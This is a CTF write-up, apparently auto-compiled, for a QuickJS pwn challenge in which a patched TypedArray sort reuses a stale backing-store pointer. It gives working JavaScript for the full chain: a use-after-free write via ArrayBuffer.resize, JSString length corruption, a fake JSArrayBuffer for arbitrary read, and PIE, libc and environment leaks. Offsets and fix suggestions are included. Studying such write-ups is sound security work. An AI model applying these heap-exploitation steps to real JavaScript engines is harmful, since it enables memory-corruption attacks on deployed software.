# Pinned QuickJS III

```
> TPCTF 2026 · pwn · 挑战 ID `AUTHORED-E85242F2` · 状态 solved
```

## 一句话

Same service, lifecycle-flavoured patch: the typed-array sort path caches the backing-store pointer across a user comparator call.

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `AUTHORED-E85242F2.zip` | 1.5 MB | `4251f6493523…` |
| `zip/patch.diff` | 1.2 KB | `77f6b60dbd0c…` |
| `zip/README.md` | 858 B | `15d1be37b64c…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 题面与附件

• 题目：Pinned QuickJS III，挑战 ID AUTHORED-E85242F2。
• 服务：TCP JSON-Lines，{"code":"<javascript>"}\n 请求，单行 JSON 响应；每条连接一个 fresh worker。
• 目标：从 worker 环境读取 QJS_CTF_FLAG。
• 附件：
• pinned_qjs3/patch.diff
• pinned_qjs3/quickjs-base-bundle.tar.gz
• 本实例服务地址为 172.16.221.2:1337。

### 观察与证据

1. 补丁把 backing-store 指针缓存过了 user comparator

pinned_qjs3/patch.diff:13 在排序前保存 array_ptr：

```
array_ptr = p->u.array.u.ptr;
array = js_malloc(ctx, len * elt_size);
memcpy(array, array_ptr, len * elt_size);
```

原来的 else 分支会在排序结束后重新读取 p->u.array.u.ptr（pinned_qjs3/patch.diff:26 删除）：

```
} else {
-                void *array_ptr = p->u.array.u.ptr; len = min_int(len, p->u.array.count);
```

排序后的写回仍然使用缓存的 array_ptr（pinned_qjs3/third_party/quickjs/src/quickjs.c:58681-58706）：

```
len = min_int(len, p->u.array.count);
```

...

```
((uint8_t *)array_ptr)[i] = ((uint8_t *)array)[j];
```

如果 comparator 内调用 ArrayBuffer.prototype.resize()，js_realloc() 可能把旧 data 释放并搬到新地址：

```
// pinned_qjs3/third_party/quickjs/src/quickjs.c:57027
data = js_realloc(ctx, abuf->data, max_int(len, 1));
```

...

```
abuf->byte_length = len;
abuf->data = data;
```

但排序结束后 array_ptr 仍指向旧地址，于是写回变成 use-after-free write。

2. resize 会保留 view 的 count，transfer 不会

js_array_buffer_update_typed_arrays() 在 resize 后重新计算 view（pinned_qjs3/third_party/quickjs/src/quickjs.c:56817-56824）：

```
p->u.array.count = 0;
p->u.array.u.ptr = NULL;
```

...

```
if (len >= (int64_t)ta->offset + size_elem) {
p->u.array.count = (len - ta->offset) >> size_log2;
p->u.array.u.ptr = &data[ta->offset];
}
```

所以 resize 后 count 仍大于 0，排序后的 len = min(len, count) 仍会执行写回。而 detach / transfer() 会把 byte_length 设为 0，进而让 count = 0，排序后的写回不会发生。因此本题必须用 resize 制造 move，而不是 detach。

远程验证 resize 确实会移动数据，且排序后写入新 buffer：

```js
var ab = new ArrayBuffer(0x40, {maxByteLength: 0x100});
var ta = new Uint8Array(ab);
ta.fill(65);
var moved = false;
var r = ta.sort((a, b) => {
if (!moved) { moved = true; ab.resize(0x80); }
return 0;
});
JSON.stringify([r.length, new Uint8Array(ab).length, moved, new Uint8Array(ab)[0]]);
```

返回：

[128,128,true,65]

3. 0x38 字节块复用：把 stale write 变成 JSString OOB

关键测试：

```js
var ab = new ArrayBuffer(0x38, {maxByteLength: 0x200});
var ta = new Uint8Array(ab);
for (var i = 0; i < 0x38; i++) ta[i] = 0;
ta[0] = 0x00; ta[1] = 0x40; ta[2] = 0; ta[3] = 0; // fake length 0x4000
var s = null, moved = false;
var r = ta.sort((a, b) => {
if (!moved) {
moved = true;
ab.resize(0x100);
s = "A".repeat(39);
}
return 0;
});
JSON.stringify([s.length, moved, r.length]);
```

返回：

[4096,true,256]

换成 fake length 256 时返回 [256,true,256]，说明 s.length 确实被 stale write 改写。

而 ab 长度 0x40、字符串长度 47 的版本没有复用，s.length 仍为 47；因此必须使用 0x38 的 ArrayBuffer + 39 字节 JSString。

原因是：

• JSString 的 len 在 +0x00，union u（字符数据）在 +0x0c，sizeof(JSString) = 0x10；
• 39 字节字符串的分配大小为 0x10 + 39 + 1 = 0x38；
• 0x38 的旧 data 块被释放后，正好被这个 JSString 复用；
• 排序后的 0x38 字节写回覆盖 JSString 头部，将 len 改成 fake length，s.charCodeAt(i) 就从字符串数据开始 OOB 读。

注意：s1.charCodeAt(0) 对应 0x38 block 的 +0x0c，而不是 +0x00；下一个 0x40 block 的起始位于字符串数据偏移 0x40 - 0x0c = 0x34。

4. 关键对象布局

| 对象 | 字段 | 偏移 |
| --- | --- | --- |
| JSObject | GC link | +0x00 / +0x08 |
|  | flags | +0x10 |
|  | class_id | +0x12 |
|  | shape | +0x18 |
|  | prop | +0x20 |
|  | u.typed_array | +0x28 |
|  | u.array.u.ptr | +0x30 |
|  | u.array.count | +0x38 |
| JSTypedArray | link | +0x00 |
|  | obj | +0x10 |
|  | buffer | +0x18 |
|  | offset | +0x20 |
|  | length | +0x24 |
| JSArrayBuffer | byte_length | +0x00 |
|  | max_byte_length | +0x04 |
|  | detached | +0x08 |
|  | shared | +0x09 |
|  | data | +0x10 |
|  | array_list.next | +0x18 |
|  | array_list.prev | +0x20 |
|  | opaque | +0x28 |
|  | free_func | +0x30 |
| JSString | len:31 | +0x00 |
|  | char data | +0x0c |

QuickJS 分配器：JS_MALLOC_MAX_SMALL_SIZE = 512，8 字节 JSMallocBlockHeader；0x38 的分配落在 0x40 block class，多个对象可以复用同一个释放块。

### 分析与验证

最终利用脚本：pinned_qjs3/exploit3e.py。整个链条在 一次 JSON-Lines 请求内完成；跨请求会改变 heap 布局，导致后续 ArrayBuffer 结构不可预测。

**5.1 Stage 1：JSString OOB read**

```js
var ab1 = new ArrayBuffer(0x38, {maxByteLength: 0x200});
var ta1 = new Uint8Array(ab1);
for (var i = 0; i < 0x38; i++) ta1[i] = 0;
ta1[0] = 0; ta1[1] = 0x40; // fake length 0x4000
var s1 = null, m1 = false;
```

ta1.sort(function (a, b) {

```
if (!m1) {
m1 = true;
ab1.resize(0x100);
s1 = "A".repeat(39);
}
return 0;
});
```

此时 s1.length == 0x4000，s1.charCodeAt(i) 可以读取 s1 数据之后的堆内容。

**5.2 找 JSArrayBuffer 结构并泄露 PIE**

在 OOB 区域扫描 byte_length = 0x38, max_byte_length = 0x200 的结构：

```
if (b(i) == 0x38 && b(i+1) == 0 && b(i+2) == 0 && b(i+3) == 0 &&
```

b(i+4) == 0 && b(i+5) == 2 && b(i+6) == 0 && b(i+7) == 0) {

```
cands.push(i);
}
```

每个结构：

• data 在 +0x10；
• free_func 在 +0x30。

free_func 指向 PIE 内的 js_array_buffer_free。在本地构建的 patched runner 中：

```
js_array_buffer_free = 0xdb70
```

因此：

```js
var pie = qq(cands[0] + 0x30) - 0xdb70;
```

exploit3e.py 通过 nm -n build/qjs_runner 和 Ubuntu 24.04 的 libc 验证了该偏移。

**5.3 伪造 JSArrayBuffer 得到任意读**

对 ab2 / ab3 / ab4 分别执行 corrupt(tag, data_ptr, target, len)：

1. 把 view 的 0x38 字节填成 fake JSArrayBuffer：

set32(a, 0x00, len);              // byte_length

set32(a, 0x04, len);              // max_byte_length

set64(a, 0x10, target);           // data

set64(a, 0x18, data_ptr + 0x18);  // array_list.next = self

set64(a, 0x20, data_ptr + 0x18);  // array_list.prev = self

其余字段保持 0：detached = 0、shared = 0、opaque = 0、free_func = 0。

2. 触发 sort：

```js
abN.resize(0x100);
TN = new ArrayBuffer(0x100);
```

abN 的原 data 块被释放；new ArrayBuffer(0x100) 的 JSArrayBuffer 结构（0x38 字节）复用该块，随后被 stale write 覆盖。

3. 用 fake 结构创建 view：

```
VN = new Uint8Array(TN, 0, len);
```

byte_length 足够大且 data = target，于是 VN 就是对任意地址的读窗口。

**5.4 从 PIE 到 libc、栈和 flag**

三次 corrupt：

```js
corrupt(1, d[1], pie, 0x100000);
var freeptr = rd64v(V[1], 0xeee88);   // GOT free
var libc = freeptr - 0xade30;
corrupt(2, d[2], libc, 0x300000);
var env = rd64v(V[2], 0x20bd58);      // __environ
if (!(env > 0x7f0000000000 && env < 0x800000000000))
```

env = rd64v(V[2], 0x20ad58);      // 旧 glibc fallback

```js
var page = env - (env % 4096);
corrupt(3, d[3], page, 0x40000);
```

最后在 V[3] 中扫描 QJS_CTF_FLAG=，返回环境字符串。

关键偏移：

| 项 | 偏移/地址 |
| --- | --- |
| js_array_buffer_free | PIE + 0xdb70 |
| GOT free | PIE + 0xeee88 |
| glibc 2.39 free | libc + 0xade30 |
| __environ（2.39-0ubuntu8.9） | libc + 0x20bd58 |
| __environ（旧 8.6） | libc + 0x20ad58 |

### 结果

远程返回：

```
QJS_CTF_FLAG=«FLAG»
```

Flag：

«FLAG»

平台提交结果：

```
{"correct":true,"solve_time_s":895.2,"solve_rank":69,"challenge_fully_solved":true}
```

复现：

```bash
python pinned_qjs3/exploit3e.py
```

脚本依赖 pinned_qjs3/client3.py，默认连接 172.16.221.2:1337；如实例地址变化，修改 client3.py 的 HOST / PORT。

### 修复建议

1. 排序结束后重新读取当前的 backing pointer，而不是使用缓存的 array_ptr：

```
array_ptr = p->u.array.u.ptr;
```

并在写回前重新用 typed_array_is_oob() / 当前 count 校验。

2. 如果 comparator 允许修改 backing store，则应在排序期间禁止 resize/detach，或在每次 comparator 返回后刷新 p->u.array、ta->length 和 abuf->data。
3. 写回时同时验证 len <= p->u.array.count 且 array_ptr 与当前 abuf->data 一致，避免 backing store 移动后仍写旧地址。

## 结果

- flag sha256：`db3bb4dfacea1752259345626c3c3d916e3af9c3d8914a3ca1d8ee0c2f691018`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- `solve/exploit3.py`
- `solve/client3.py`

## 待核实

- 本条目由 WP 第 26 节《Pinned QuickJS III》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
